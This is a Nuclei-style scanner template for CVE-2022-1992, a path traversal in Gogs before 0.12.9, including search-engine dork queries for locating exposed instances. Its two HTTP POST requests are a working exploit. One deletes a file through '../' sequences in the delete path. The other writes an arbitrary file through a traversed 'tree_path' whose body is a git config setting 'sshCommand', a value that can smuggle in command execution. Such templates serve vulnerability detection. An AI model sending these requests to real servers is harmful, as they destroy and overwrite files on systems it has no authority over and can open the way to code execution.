id: CVE-2022-1992

info:
  name: Path Traversal in GitHub repository gogs/gogs
  author: ProjectDiscoveryAI
  severity: critical
  description: Path Traversal in GitHub repository gogs/gogs prior to 0.12.9 allows deletion and writing of arbitrary files.
  impact: |
    High impact as it can lead to unauthorized access to sensitive files and data.
  remediation: |
    Upgrade to the latest version of gogs/gogs to patch the CVE-2022-1992 vulnerability.
  reference:
    - https://huntr.dev/bounties/2e8cdc57-a9cf-46ae-9088-87f09e6c90ab
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2022-1992
    cwe-id: CWE-22
    epss-score: 0.00092
    epss-percentile: 0.40935
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
  metadata:
    vendor: gogs
    product: gogs
    shodan-query: title:"Sign In - Gogs"
    fofa-query:
      - title="installation - gogs"
      - title="sign in - gogs"
    google-query:
      - intitle:"installation - gogs"
      - intitle:"sign in - gogs"
  tags: huntr

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin1/repo6/_delete/master/../../../../README.md"

    headers:
      Content-Length: "130"
      Cookie: "lang=zh-CN; i_like_gogs=858a2bd132c75d53"

    body: |
      _csrf=PuAr2ZVY2NpoEOR1se-J81LVboM6MTY1NDAwODAzNDgzNDEwOTAwMA
      &commit_summary=
      &commit_message=
      &commit_choice=direct
      &new_branch_name=
    matchers:
      - type: word
        words:
          - "File deleted successfully"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/admin1/repo6/_edit/master/test"

    headers:
      Content-Length: "722"
      Cookie: "lang=zh-CN; i_like_gogs=858a2bd132c75d53"

    body: |
      _csrf=CQ7KgJoDP2oI1xKrj0bx1GtYiQ46MTY1NDAwNzk1MjA5ODk5MTQwMA
      &last_commit=11e2a5c721b9f9cbe4bb32bcdcc6318794e350ff
      &tree_path=../../../../file111
      &content=%5Bcore%5D%0D%0A++++repositoryformatversion+%3D+0%0D%0A++++filemode%3D+true%0D%0A++++bare%3D+false%0D%0A++++logallrefupdates%3D+true%0D%0A++++ignorecase%3D+true%0D%0A++++precomposeunicode%3D+true%0D%0A++++sshCommand%3D+notepad%0D%0A%5Bremote+%22origin%22%5D%0D%0A++++url%3D+git%40github.com%3Atorvalds%2Flinux.git%0D%0A++++fetch%3D+%2Brefs%2Fheads%2F*%3Arefs%2Fremotes%2Forigin%2F*%0D%0A%5Bbranch+%22master%22%5D%0D%0A++++remote%3D+origin%0D%0A++++merge%3D+refs%2Fheads%2Fmaster%0D%0A%0D%0A%0D%0A
      &commit_summary=
      &commit_message=
      &commit_choice=direct
      &new_branch_name=
    matchers:
      - type: word
        words:
          - "File written successfully"
        part: body
